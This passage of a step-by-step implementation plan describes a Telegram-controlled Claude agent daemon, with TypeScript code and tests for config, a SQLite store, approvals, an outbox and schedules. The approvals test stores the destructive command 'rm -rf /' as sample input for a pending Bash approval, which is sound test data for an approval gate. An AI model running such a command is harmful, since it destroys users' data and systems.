# Personal Agent Runtime Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** An always-on macOS daemon that lets whitelisted Telegram users drive a full-capability Claude Code agent with persistent memory, durable message queueing, Telegram-button approvals for risky actions, and cron scheduling — authenticated via Claude subscription (no API key).

**Architecture:** One Node.js process with five units talking through SQLite (WAL): Telegram Gateway (grammY long polling, whitelist, persist-before-process), sequential Agent Worker (Claude Agent SDK with session resume), Permission Gate (`canUseTool` → inline Approve/Deny), outbox Sender (retry/backoff), and a cron Scheduler. Two folders: user-provided Agent Home (CLAUDE.md, memory/) and automatic App Data (`~/Library/Application Support/agent-runtime/` — DB, logs, config). launchd supervises.

**Tech Stack:** Node.js 22, TypeScript (ESM/NodeNext), `@anthropic-ai/claude-agent-sdk`, `grammy`, `better-sqlite3`, `cron-parser@^4`, `zod`, `vitest`.

**Spec:** `docs/superpowers/specs/2026-06-10-personal-agent-runtime-design.md`

**Conventions for all tasks:**
- Tests live in `tests/`, named `*.test.ts`, run with `npx vitest run <file>`.
- All `src/` imports use `.js` extensions (NodeNext ESM).
- In-memory DB for tests: `openDb(':memory:')`.
- Commit after every green test run.

---

### Task 1: Project scaffold

**Files:**
- Create: `package.json`, `tsconfig.json`, `.gitignore`, `src/version.ts`, `tests/smoke.test.ts`

- [ ] **Step 1: Create package.json**

```json
{
  "name": "agent-runtime",
  "version": "0.1.0",
  "private": true,
  "type": "module",
  "engines": { "node": ">=22" },
  "scripts": {
    "build": "tsc",
    "dev": "tsx src/index.ts",
    "test": "vitest run"
  },
  "dependencies": {
    "@anthropic-ai/claude-agent-sdk": "^0.1.0",
    "better-sqlite3": "^11.0.0",
    "cron-parser": "^4.9.0",
    "grammy": "^1.30.0",
    "zod": "^3.23.0"
  },
  "devDependencies": {
    "@types/better-sqlite3": "^7.6.0",
    "@types/node": "^22.0.0",
    "tsx": "^4.19.0",
    "typescript": "^5.6.0",
    "vitest": "^2.1.0"
  }
}
```

- [ ] **Step 2: Create tsconfig.json and .gitignore**

`tsconfig.json`:
```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "NodeNext",
    "moduleResolution": "NodeNext",
    "strict": true,
    "outDir": "dist",
    "rootDir": "src",
    "declaration": false,
    "sourceMap": true,
    "skipLibCheck": true
  },
  "include": ["src"]
}
```

`.gitignore`:
```
node_modules/
dist/
*.log
```

- [ ] **Step 3: Install dependencies**

Run: `npm install`
Expected: lockfile created, no errors. If `@anthropic-ai/claude-agent-sdk@^0.1.0` is not the current version, install latest: `npm install @anthropic-ai/claude-agent-sdk@latest`.

- [ ] **Step 4: Write smoke test**

`src/version.ts`:
```ts
export const VERSION = '0.1.0';
```

`tests/smoke.test.ts`:
```ts
import { describe, it, expect } from 'vitest';
import { VERSION } from '../src/version.js';

describe('smoke', () => {
  it('toolchain compiles and runs TS', () => {
    expect(VERSION).toBe('0.1.0');
  });
});
```

- [ ] **Step 5: Run test, verify pass, commit**

Run: `npx vitest run tests/smoke.test.ts`
Expected: 1 passed.

```bash
git add -A && git commit -m "chore: scaffold Node.js/TypeScript project"
```

---

### Task 2: App Data paths + config loading

**Files:**
- Create: `src/paths.ts`, `src/config.ts`
- Test: `tests/config.test.ts`

- [ ] **Step 1: Write failing tests**

`tests/config.test.ts`:
```ts
import { describe, it, expect, beforeEach } from 'vitest';
import { mkdtempSync, existsSync, readFileSync, writeFileSync, mkdirSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { appPaths, ensureAppData } from '../src/paths.js';
import { loadConfig, ConfigError } from '../src/config.js';

let root: string;
beforeEach(() => { root = mkdtempSync(join(tmpdir(), 'art-')); });

describe('paths', () => {
  it('derives all paths from root and creates dirs', () => {
    const p = appPaths(root);
    ensureAppData(p);
    expect(p.dbPath).toBe(join(root, 'agent.db'));
    expect(existsSync(p.logsDir)).toBe(true);
    expect(existsSync(p.backupsDir)).toBe(true);
  });
});

describe('loadConfig', () => {
  it('writes a template and throws on first run', () => {
    const cfgPath = join(root, 'config.json');
    expect(() => loadConfig(cfgPath)).toThrow(ConfigError);
    const tpl = JSON.parse(readFileSync(cfgPath, 'utf8'));
    expect(tpl).toHaveProperty('telegramBotToken');
    expect(tpl).toHaveProperty('whitelist');
    expect(tpl).toHaveProperty('agentHome');
  });

  it('rejects empty whitelist and missing agentHome dir', () => {
    const cfgPath = join(root, 'config.json');
    writeFileSync(cfgPath, JSON.stringify({ telegramBotToken: 't', whitelist: [], agentHome: '/nope' }));
    expect(() => loadConfig(cfgPath)).toThrow(/whitelist/);
    writeFileSync(cfgPath, JSON.stringify({ telegramBotToken: 't', whitelist: [1], agentHome: '/nope' }));
    expect(() => loadConfig(cfgPath)).toThrow(/agentHome/);
  });

  it('loads a valid config with defaults applied', () => {
    const home = join(root, 'home'); mkdirSync(home);
    const cfgPath = join(root, 'config.json');
    writeFileSync(cfgPath, JSON.stringify({ telegramBotToken: 't', whitelist: [11, 22], agentHome: home }));
    const cfg = loadConfig(cfgPath);
    expect(cfg.whitelist).toEqual([11, 22]);
    expect(cfg.approvalTimeoutMs).toBe(900_000);
    expect(cfg.bashAllowlist.length).toBeGreaterThan(0);
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run tests/config.test.ts`
Expected: FAIL — cannot resolve `../src/paths.js`.

- [ ] **Step 3: Implement**

`src/paths.ts`:
```ts
import { homedir } from 'node:os';
import { join } from 'node:path';
import { mkdirSync } from 'node:fs';

export interface AppPaths {
  root: string;
  dbPath: string;
  configPath: string;
  logsDir: string;
  backupsDir: string;
}

export function appPaths(
  root: string = join(homedir(), 'Library', 'Application Support', 'agent-runtime'),
): AppPaths {
  return {
    root,
    dbPath: join(root, 'agent.db'),
    configPath: join(root, 'config.json'),
    logsDir: join(root, 'logs'),
    backupsDir: join(root, 'backups'),
  };
}

export function ensureAppData(p: AppPaths): void {
  mkdirSync(p.logsDir, { recursive: true });
  mkdirSync(p.backupsDir, { recursive: true });
}
```

`src/config.ts`:
```ts
import { existsSync, readFileSync, statSync, writeFileSync } from 'node:fs';

export interface Config {
  telegramBotToken: string;
  whitelist: number[];
  agentHome: string;
  claudeOauthToken?: string;
  approvalTimeoutMs: number;
  bashAllowlist: string[];
}

export class ConfigError extends Error {}

const DEFAULT_BASH_ALLOWLIST = [
  '^git (status|log|diff|show)\\b',
  '^ls\\b',
  '^grep\\b',
  '^cat\\b',
  '^echo\\b',
  '^pwd$',
];

const TEMPLATE = {
  telegramBotToken: '',
  whitelist: [],
  agentHome: '',
  claudeOauthToken: '',
  approvalTimeoutMs: 900_000,
  bashAllowlist: DEFAULT_BASH_ALLOWLIST,
};

export function loadConfig(configPath: string): Config {
  if (!existsSync(configPath)) {
    writeFileSync(configPath, JSON.stringify(TEMPLATE, null, 2) + '\n', { mode: 0o600 });
    throw new ConfigError(
      `First run: created config template at ${configPath}. ` +
        `Fill in telegramBotToken, whitelist (Telegram user IDs), and agentHome (existing folder), then restart.`,
    );
  }
  const raw = JSON.parse(readFileSync(configPath, 'utf8'));
  if (!raw.telegramBotToken) throw new ConfigError('config: telegramBotToken is required');
  if (!Array.isArray(raw.whitelist) || raw.whitelist.length === 0 || !raw.whitelist.every((n: unknown) => Number.isInteger(n))) {
    throw new ConfigError('config: whitelist must be a non-empty array of Telegram user IDs');
  }
  if (!raw.agentHome || !existsSync(raw.agentHome) || !statSync(raw.agentHome).isDirectory()) {
    throw new ConfigError('config: agentHome must point to an existing directory — create it first (it is user-provided)');
  }
  return {
    approvalTimeoutMs: 900_000,
    bashAllowlist: DEFAULT_BASH_ALLOWLIST,
    ...raw,
    claudeOauthToken: raw.claudeOauthToken || undefined,
  };
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run tests/config.test.ts`
Expected: 4 passed.

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: App Data paths and config loading with first-run template"
```

---

### Task 3: Shared types + SQLite schema

**Files:**
- Create: `src/types.ts`, `src/db.ts`
- Test: `tests/db.test.ts`

- [ ] **Step 1: Write failing test**

`tests/db.test.ts`:
```ts
import { describe, it, expect } from 'vitest';
import { openDb } from '../src/db.js';

describe('openDb', () => {
  it('creates all tables and enables WAL', () => {
    const db = openDb(':memory:');
    const tables = db
      .prepare(`SELECT name FROM sqlite_master WHERE type='table' ORDER BY name`)
      .all()
      .map((r: any) => r.name);
    for (const t of ['inbox', 'tasks', 'sessions', 'schedules', 'approvals', 'outbox', 'meta']) {
      expect(tables).toContain(t);
    }
    expect(db.pragma('foreign_keys', { simple: true })).toBe(1);
  });

  it('rejects invalid task status via CHECK', () => {
    const db = openDb(':memory:');
    expect(() =>
      db.prepare(`INSERT INTO tasks (source, user_id, chat_id, prompt, status) VALUES ('telegram', 1, 1, 'x', 'bogus')`).run(),
    ).toThrow();
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/db.test.ts`
Expected: FAIL — cannot resolve `../src/db.js`.

- [ ] **Step 3: Implement types and db**

`src/types.ts`:
```ts
export type TaskStatus = 'queued' | 'running' | 'done' | 'failed' | 'interrupted' | 'cancelled';
export type TaskKind = 'chat' | 'rotate' | 'resume';
export type TaskSource = 'telegram' | 'schedule';

export interface Task {
  id: number;
  source: TaskSource;
  kind: TaskKind;
  userId: number;
  chatId: number;
  prompt: string;
  status: TaskStatus;
  sessionId: string | null;
  resultSummary: string | null;
}

export type OutKind = 'reply' | 'edit' | 'approval' | 'proactive';

export interface OutMessage {
  id: number;
  chatId: number;
  kind: OutKind;
  content: string;
  replyMarkup: string | null;
  editOf: number | null;
  attempts: number;
  lastAttemptAt: string | null;
}

export interface Schedule {
  id: number;
  cronExpr: string;
  prompt: string;
  enabled: boolean;
  missedPolicy: 'run_now' | 'skip';
  createdByUserId: number;
  chatId: number;
  lastRunAt: string | null;
}

export type Decision = 'approved' | 'denied' | 'timeout' | 'auto_approved';

export type PermissionResult =
  | { behavior: 'allow'; updatedInput: Record<string, unknown> }
  | { behavior: 'deny'; message: string };

export type CanUseTool = (toolName: string, input: Record<string, unknown>) => Promise<PermissionResult>;

export type RunEvent =
  | { kind: 'session'; sessionId: string }
  | { kind: 'progress'; text: string }
  | { kind: 'final'; text: string };

export interface RunRequest {
  prompt: string;
  cwd: string;
  resume?: string;
  signal: AbortSignal;
  canUseTool: CanUseTool;
  mcpServers?: Record<string, unknown>;
}

export interface ClaudeRunner {
  run(req: RunRequest): AsyncIterable<RunEvent>;
}

export class UsageLimitError extends Error {
  constructor(public resetAt: Date | null) {
    super('Subscription usage limit reached');
  }
}
```

`src/db.ts`:
```ts
import Database from 'better-sqlite3';

const SCHEMA = `
CREATE TABLE IF NOT EXISTS inbox (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  update_id INTEGER UNIQUE NOT NULL,
  payload TEXT NOT NULL,
  received_at TEXT NOT NULL DEFAULT (datetime('now')),
  processed_at TEXT
);
CREATE TABLE IF NOT EXISTS tasks (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  source TEXT NOT NULL CHECK (source IN ('telegram','schedule')),
  kind TEXT NOT NULL DEFAULT 'chat' CHECK (kind IN ('chat','rotate','resume')),
  user_id INTEGER NOT NULL,
  chat_id INTEGER NOT NULL,
  prompt TEXT NOT NULL,
  status TEXT NOT NULL DEFAULT 'queued'
    CHECK (status IN ('queued','running','done','failed','interrupted','cancelled')),
  session_id TEXT,
  result_summary TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now')),
  started_at TEXT,
  finished_at TEXT
);
CREATE TABLE IF NOT EXISTS sessions (
  user_id INTEGER PRIMARY KEY,
  claude_session_id TEXT NOT NULL,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);
CREATE TABLE IF NOT EXISTS schedules (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  cron_expr TEXT NOT NULL,
  prompt TEXT NOT NULL,
  enabled INTEGER NOT NULL DEFAULT 1,
  missed_policy TEXT NOT NULL DEFAULT 'run_now' CHECK (missed_policy IN ('run_now','skip')),
  created_by_user_id INTEGER NOT NULL,
  chat_id INTEGER NOT NULL,
  last_run_at TEXT
);
CREATE TABLE IF NOT EXISTS approvals (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  task_id INTEGER NOT NULL REFERENCES tasks(id),
  tool_name TEXT NOT NULL,
  tool_input TEXT NOT NULL,
  decision TEXT CHECK (decision IN ('approved','denied','timeout','auto_approved')),
  requested_at TEXT NOT NULL DEFAULT (datetime('now')),
  decided_at TEXT
);
CREATE TABLE IF NOT EXISTS outbox (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  chat_id INTEGER NOT NULL,
  kind TEXT NOT NULL DEFAULT 'reply' CHECK (kind IN ('reply','edit','approval','proactive')),
  content TEXT NOT NULL,
  reply_markup TEXT,
  edit_of INTEGER REFERENCES outbox(id),
  message_id INTEGER,
  attempts INTEGER NOT NULL DEFAULT 0,
  last_attempt_at TEXT,
  sent_at TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);
CREATE TABLE IF NOT EXISTS meta (
  key TEXT PRIMARY KEY,
  value TEXT NOT NULL
);
`;

export function openDb(path: string): Database.Database {
  const db = new Database(path);
  db.pragma('journal_mode = WAL');
  db.pragma('foreign_keys = ON');
  db.exec(SCHEMA);
  return db;
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/db.test.ts`
Expected: 2 passed.

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: shared types and SQLite schema (WAL)"
```

---

### Task 4: Store — inbox, tasks, sessions

**Files:**
- Create: `src/store.ts`
- Test: `tests/store-tasks.test.ts`

- [ ] **Step 1: Write failing tests**

`tests/store-tasks.test.ts`:
```ts
import { describe, it, expect, beforeEach } from 'vitest';
import { openDb } from '../src/db.js';
import { Store } from '../src/store.js';

let store: Store;
beforeEach(() => { store = new Store(openDb(':memory:')); });

describe('inbox', () => {
  it('records updates once; duplicates return false', () => {
    expect(store.recordUpdate(100, '{"a":1}')).toBe(true);
    expect(store.recordUpdate(100, '{"a":1}')).toBe(false);
  });
});

describe('tasks', () => {
  const t = { source: 'telegram', kind: 'chat', userId: 7, chatId: 7, prompt: 'hi' } as const;

  it('enqueues and claims FIFO, marking running', () => {
    const a = store.enqueueTask(t);
    const b = store.enqueueTask({ ...t, prompt: 'second' });
    const claimed = store.claimNextTask();
    expect(claimed?.id).toBe(a);
    expect(claimed?.status).toBe('running');
    expect(store.claimNextTask()?.id).toBe(b);
    expect(store.claimNextTask()).toBeUndefined();
  });

  it('finishes, requeues, attaches session', () => {
    const id = store.enqueueTask(t);
    store.claimNextTask();
    store.attachSession(id, 'sess-1');
    store.finishTask(id, 'done', 'summary');
    expect(store.getTask(id)).toMatchObject({ status: 'done', sessionId: 'sess-1', resultSummary: 'summary' });
    store.requeueTask(id);
    expect(store.getTask(id)?.status).toBe('queued');
  });

  it('marks running tasks interrupted on startup', () => {
    const id = store.enqueueTask(t);
    store.claimNextTask();
    const interrupted = store.markInterruptedOnStartup();
    expect(interrupted.map((x) => x.id)).toEqual([id]);
    expect(store.getTask(id)?.status).toBe('interrupted');
  });

  it('pendingTasks lists queued+running in order', () => {
    store.enqueueTask(t);
    store.enqueueTask({ ...t, prompt: 'b' });
    store.claimNextTask();
    const p = store.pendingTasks();
    expect(p.map((x) => x.status)).toEqual(['running', 'queued']);
  });
});

describe('sessions', () => {
  it('set/get/rotate per user', () => {
    expect(store.getSession(7)).toBeUndefined();
    store.setSession(7, 's1');
    store.setSession(7, 's2');
    expect(store.getSession(7)?.claudeSessionId).toBe('s2');
    store.rotateSession(7);
    expect(store.getSession(7)).toBeUndefined();
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run tests/store-tasks.test.ts`
Expected: FAIL — cannot resolve `../src/store.js`.

- [ ] **Step 3: Implement Store (part 1)**

`src/store.ts`:
```ts
import type { Database } from 'better-sqlite3';
import type { Task, TaskKind, TaskSource, TaskStatus } from './types.js';

export class Store {
  constructor(private db: Database) {}

  // ---- inbox ----
  recordUpdate(updateId: number, payload: string): boolean {
    try {
      this.db.prepare(`INSERT INTO inbox (update_id, payload) VALUES (?, ?)`).run(updateId, payload);
      return true;
    } catch (e: any) {
      if (String(e.code).startsWith('SQLITE_CONSTRAINT')) return false;
      throw e;
    }
  }

  markProcessed(updateId: number): void {
    this.db.prepare(`UPDATE inbox SET processed_at = datetime('now') WHERE update_id = ?`).run(updateId);
  }

  // ---- tasks ----
  enqueueTask(t: { source: TaskSource; kind: TaskKind; userId: number; chatId: number; prompt: string }): number {
    const r = this.db
      .prepare(`INSERT INTO tasks (source, kind, user_id, chat_id, prompt) VALUES (?, ?, ?, ?, ?)`)
      .run(t.source, t.kind, t.userId, t.chatId, t.prompt);
    return Number(r.lastInsertRowid);
  }

  getTask(id: number): Task | undefined {
    const row = this.db.prepare(`SELECT * FROM tasks WHERE id = ?`).get(id) as any;
    return row ? toTask(row) : undefined;
  }

  claimNextTask(): Task | undefined {
    const claim = this.db.transaction((): Task | undefined => {
      const row = this.db.prepare(`SELECT * FROM tasks WHERE status = 'queued' ORDER BY id LIMIT 1`).get() as any;
      if (!row) return undefined;
      this.db.prepare(`UPDATE tasks SET status = 'running', started_at = datetime('now') WHERE id = ?`).run(row.id);
      return toTask({ ...row, status: 'running' });
    });
    return claim();
  }

  finishTask(id: number, status: 'done' | 'failed' | 'cancelled', summary?: string): void {
    this.db
      .prepare(`UPDATE tasks SET status = ?, result_summary = ?, finished_at = datetime('now') WHERE id = ?`)
      .run(status, summary ?? null, id);
  }

  requeueTask(id: number): void {
    this.db.prepare(`UPDATE tasks SET status = 'queued', started_at = NULL WHERE id = ?`).run(id);
  }

  attachSession(taskId: number, sessionId: string): void {
    this.db.prepare(`UPDATE tasks SET session_id = ? WHERE id = ?`).run(sessionId, taskId);
  }

  pendingTasks(): Task[] {
    const rows = this.db
      .prepare(`SELECT * FROM tasks WHERE status IN ('running','queued') ORDER BY id`)
      .all() as any[];
    return rows.map(toTask);
  }

  markInterruptedOnStartup(): Task[] {
    const rows = this.db.prepare(`SELECT * FROM tasks WHERE status = 'running'`).all() as any[];
    this.db.prepare(`UPDATE tasks SET status = 'interrupted' WHERE status = 'running'`).run();
    return rows.map((r) => toTask({ ...r, status: 'interrupted' }));
  }

  // ---- sessions ----
  getSession(userId: number): { claudeSessionId: string } | undefined {
    const row = this.db.prepare(`SELECT claude_session_id FROM sessions WHERE user_id = ?`).get(userId) as any;
    return row ? { claudeSessionId: row.claude_session_id } : undefined;
  }

  setSession(userId: number, claudeSessionId: string): void {
    this.db
      .prepare(
        `INSERT INTO sessions (user_id, claude_session_id) VALUES (?, ?)
         ON CONFLICT(user_id) DO UPDATE SET claude_session_id = excluded.claude_session_id`,
      )
      .run(userId, claudeSessionId);
  }

  rotateSession(userId: number): void {
    this.db.prepare(`DELETE FROM sessions WHERE user_id = ?`).run(userId);
  }
}

function toTask(row: any): Task {
  return {
    id: row.id,
    source: row.source as TaskSource,
    kind: row.kind as TaskKind,
    userId: row.user_id,
    chatId: row.chat_id,
    prompt: row.prompt,
    status: row.status as TaskStatus,
    sessionId: row.session_id ?? null,
    resultSummary: row.result_summary ?? null,
  };
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `npx vitest run tests/store-tasks.test.ts`
Expected: 6 passed.

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: store for inbox, tasks (FIFO claim), sessions"
```

---

### Task 5: Store — outbox, approvals, schedules, meta

**Files:**
- Modify: `src/store.ts` (append methods inside the `Store` class, before the closing brace)
- Test: `tests/store-outbox.test.ts`

- [ ] **Step 1: Write failing tests**

`tests/store-outbox.test.ts`:
```ts
import { describe, it, expect, beforeEach } from 'vitest';
import { openDb } from '../src/db.js';
import { Store } from '../src/store.js';

let store: Store;
beforeEach(() => { store = new Store(openDb(':memory:')); });

describe('outbox', () => {
  it('enqueues, lists unsent, marks sent', () => {
    const id = store.enqueueMessage({ chatId: 5, content: 'hello' });
    expect(store.unsentMessages().map((m) => m.id)).toEqual([id]);
    store.markSent(id, 999);
    expect(store.unsentMessages()).toEqual([]);
    expect(store.sentMessageId(id)).toBe(999);
  });

  it('coalesces pending edits for the same target', () => {
    const orig = store.enqueueMessage({ chatId: 5, content: 'status' });
    store.enqueueEdit(orig, 'progress 1');
    const e2 = store.enqueueEdit(orig, 'progress 2');
    const unsent = store.unsentMessages();
    expect(unsent.filter((m) => m.kind === 'edit').map((m) => m.id)).toEqual([e2]);
    expect(unsent.find((m) => m.id === e2)?.content).toBe('progress 2');
  });

  it('bumpAttempts tracks retry state and caps listing at 8 attempts', () => {
    const id = store.enqueueMessage({ chatId: 5, content: 'x' });
    for (let i = 0; i < 8; i++) store.bumpAttempts(id, new Date());
    expect(store.unsentMessages()).toEqual([]);
  });
});

describe('approvals', () => {
  it('creates pending and decides', () => {
    const tid = store.enqueueTask({ source: 'telegram', kind: 'chat', userId: 1, chatId: 1, prompt: 'p' });
    const id = store.createApproval(tid, 'Bash', 'command: rm -rf /', null);
    store.decideApproval(id, 'approved');
    const row = store.getApproval(id);
    expect(row?.decision).toBe('approved');
  });

  it('records auto_approved with decided_at set', () => {
    const tid = store.enqueueTask({ source: 'telegram', kind: 'chat', userId: 1, chatId: 1, prompt: 'p' });
    const id = store.createApproval(tid, 'Read', 'file_path: /x', 'auto_approved');
    expect(store.getApproval(id)?.decision).toBe('auto_approved');
  });
});

describe('schedules', () => {
  it('CRUD and markScheduleRun', () => {
    const id = store.createSchedule({
      cronExpr: '0 8 * * *', prompt: 'morning brief', missedPolicy: 'run_now', createdByUserId: 1, chatId: 1,
    });
    expect(store.enabledSchedules()).toHaveLength(1);
    store.markScheduleRun(id, new Date('2026-06-10T08:00:00Z'));
    expect(store.enabledSchedules()[0].lastRunAt).toContain('2026-06-10');
    store.deleteSchedule(id);
    expect(store.listSchedules()).toHaveLength(0);
  });
});

describe('meta', () => {
  it('get/set', () => {
    expect(store.getMeta('k')).toBeNull();
    store.setMeta('k', 'v');
    expect(store.getMeta('k')).toBe('v');
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run tests/store-outbox.test.ts`
Expected: FAIL — `enqueueMessage is not a function`.

- [ ] **Step 3: Append methods to the Store class**

Add inside `class Store` in `src/store.ts` (also add `OutMessage`, `Schedule`, `Decision` to the type import from `./types.js`):

```ts
  // ---- outbox ----
  enqueueMessage(m: { chatId: number; content: string; kind?: OutKind; replyMarkup?: string; editOf?: number }): number {
    const r = this.db
      .prepare(`INSERT INTO outbox (chat_id, kind, content, reply_markup, edit_of) VALUES (?, ?, ?, ?, ?)`)
      .run(m.chatId, m.kind ?? 'reply', m.content, m.replyMarkup ?? null, m.editOf ?? null);
    return Number(r.lastInsertRowid);
  }

  enqueueEdit(editOf: number, content: string): number {
    const ins = this.db.transaction((): number => {
      const orig = this.db.prepare(`SELECT chat_id FROM outbox WHERE id = ?`).get(editOf) as any;
      this.db.prepare(`DELETE FROM outbox WHERE edit_of = ? AND sent_at IS NULL`).run(editOf);
      const r = this.db
        .prepare(`INSERT INTO outbox (chat_id, kind, content, edit_of) VALUES (?, 'edit', ?, ?)`)
        .run(orig.chat_id, content, editOf);
      return Number(r.lastInsertRowid);
    });
    return ins();
  }

  unsentMessages(): OutMessage[] {
    const rows = this.db
      .prepare(`SELECT * FROM outbox WHERE sent_at IS NULL AND attempts < 8 ORDER BY id`)
      .all() as any[];
    return rows.map((r) => ({
      id: r.id, chatId: r.chat_id, kind: r.kind as OutKind, content: r.content,
      replyMarkup: r.reply_markup ?? null, editOf: r.edit_of ?? null,
      attempts: r.attempts, lastAttemptAt: r.last_attempt_at ?? null,
    }));
  }

  markSent(id: number, telegramMessageId: number): void {
    this.db
      .prepare(`UPDATE outbox SET sent_at = datetime('now'), message_id = ? WHERE id = ?`)
      .run(telegramMessageId, id);
  }

  bumpAttempts(id: number, at: Date): void {
    this.db
      .prepare(`UPDATE outbox SET attempts = attempts + 1, last_attempt_at = ? WHERE id = ?`)
      .run(at.toISOString(), id);
  }

  sentMessageId(outboxId: number): number | null {
    const row = this.db.prepare(`SELECT message_id FROM outbox WHERE id = ? AND sent_at IS NOT NULL`).get(outboxId) as any;
    return row?.message_id ?? null;
  }

  // ---- approvals ----
  createApproval(taskId: number, toolName: string, toolInput: string, decision: Decision | null): number {
    const r = this.db
      .prepare(
        `INSERT INTO approvals (task_id, tool_name, tool_input, decision, decided_at)
         VALUES (?, ?, ?, ?, CASE WHEN ? IS NULL THEN NULL ELSE datetime('now') END)`,
      )
      .run(taskId, toolName, toolInput, decision, decision);
    return Number(r.lastInsertRowid);
  }

  decideApproval(id: number, decision: Decision): void {
    this.db
      .prepare(`UPDATE approvals SET decision = ?, decided_at = datetime('now') WHERE id = ? AND decision IS NULL`)
      .run(decision, id);
  }

  getApproval(id: number): { id: number; taskId: number; toolName: string; decision: Decision | null } | undefined {
    const row = this.db.prepare(`SELECT * FROM approvals WHERE id = ?`).get(id) as any;
    return row ? { id: row.id, taskId: row.task_id, toolName: row.tool_name, decision: row.decision ?? null } : undefined;
  }

  // ---- schedules ----
  createSchedule(s: { cronExpr: string; prompt: string; missedPolicy: 'run_now' | 'skip'; createdByUserId: number; chatId: number }): number {
    const r = this.db
      .prepare(
        `INSERT INTO schedules (cron_expr, prompt, missed_policy, created_by_user_id, chat_id) VALUES (?, ?, ?, ?, ?)`,
      )
      .run(s.cronExpr, s.prompt, s.missedPolicy, s.createdByUserId, s.chatId);
    return Number(r.lastInsertRowid);
  }

  listSchedules(): Schedule[] {
    return (this.db.prepare(`SELECT * FROM schedules ORDER BY id`).all() as any[]).map(toSchedule);
  }

  enabledSchedules(): Schedule[] {
    return (this.db.prepare(`SELECT * FROM schedules WHERE enabled = 1 ORDER BY id`).all() as any[]).map(toSchedule);
  }

  deleteSchedule(id: number): void {
    this.db.prepare(`DELETE FROM schedules WHERE id = ?`).run(id);
  }

  markScheduleRun(id: number, at: Date): void {
    this.db.prepare(`UPDATE schedules SET last_run_at = ? WHERE id = ?`).run(at.toISOString(), id);
  }

  // ---- meta ----
  getMeta(key: string): string | null {
    const row = this.db.prepare(`SELECT value FROM meta WHERE key = ?`).get(key) as any;
    return row?.value ?? null;
  }

  setMeta(key: string, value: string): void {
    this.db
      .prepare(`INSERT INTO meta (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value`)
      .run(key, value);
  }
```

Add at the bottom of `src/store.ts`:

```ts
function toSchedule(row: any): Schedule {
  return {
    id: row.id,
    cronExpr: row.cron_expr,
    prompt: row.prompt,
    enabled: row.enabled === 1,
    missedPolicy: row.missed_policy,
    createdByUserId: row.created_by_user_id,
    chatId: row.chat_id,
    lastRunAt: row.last_run_at ?? null,
  };
}
```

Update the import line at the top:

```ts
import type { Decision, OutKind, OutMessage, Schedule, Task, TaskKind, TaskSource, TaskStatus } from './types.js';
```

- [ ] **Step 4: Run all store tests to verify they pass**

Run: `npx vitest run tests/store-tasks.test.ts tests/store-outbox.test.ts`
Expected: 13 passed.

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "feat: store for outbox (edit coalescing), approvals, schedules, meta"
```

---

### Task 6: Outbox Sender with retry/backoff

**Files:**
- Create: `src/sender.ts`
- Test: `tests/sender.test.ts`

- [ ] **Step 1: Write failing tests**

`tests/sender.test.ts`:
```ts
import { describe, it, expect, beforeEach } from 'vitest';
import { openDb } from '../src/db.js';
import { Store } from '../src/store.js';
import { Sender, type TelegramApi } from '../src/sender.js';

class FakeApi implements TelegramApi {
  sent: { chatId: number; text: string; markup: string | null }[] = [];
  edits: { chatId: number; messageId: number; text: string }[] = [];
  failNext = 0;
  private nextId = 100;
  async sendMessage(chatId: number, text: string, markup?: string | null): Promise<number> {
    if (this.failNext > 0) { this.failNext--; throw new Error('telegram down'); }
    this.sent.push({ chatId, text, markup: markup ?? null });
    return this.nextId++;
  }
  async editMessageText(chatId: number, messageId: number, text: string): Promise<void> {
    if (this.failNext > 0) { this.failNext--; throw new Error('telegram down'); }
    this.edits.push({ chatId, messageId, text });
  }
}

let store: Store; let api: FakeApi; let sender: Sender;
beforeEach(() => {
  store = new Store(openDb(':memory:'));
  api = new FakeApi();
  sender = new Sender(store, api);
});

describe('Sender', () => {
  it('sends pending messages and records telegram message id', async () => {
    const id = store.enqueueMessage({ chatId: 5, content: 'hi' });
    await sender.drainOnce();
    expect(api.sent).toHaveLength(1);
    expect(store.sentMessageId(id)).toBe(100);
  });

  it('keeps failed messages for retry with backoff', async () => {
    store.enqueueMessage({ chatId: 5, content: 'hi' });
    api.failNext = 1;
    await sender.drainOnce(new Date(0));
    expect(api.sent).toHaveLength(0);
    // immediately after failure: backoff not elapsed → skipped
    await sender.drainOnce(new Date(1000));
    expect(api.sent).toHaveLength(0);
    // after 2^1 seconds: retried
    await sender.drainOnce(new Date(3000));
    expect(api.sent).toHaveLength(1);
  });

  it('sends edits against the original message id, deferring if original unsent', async () => {
    const orig = store.enqueueMessage({ chatId: 5, content: 'status' });
    const edit = store.enqueueEdit(orig, 'progress');
    // drain sends orig first, then edit can resolve target on same pass order
    await sender.drainOnce();
    await sender.drainOnce();
    expect(api.edits).toEqual([{ chatId: 5, messageId: 100, text: 'progress' }]);
    expect(store.sentMessageId(edit)).toBe(100);
  });
});
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `npx vitest run tests/sender.test.ts`
Expected: FAIL — cannot resolve `../src/sender.js`.

- [ ] **Step 3: Implement**

`src/sender.ts`:
```ts
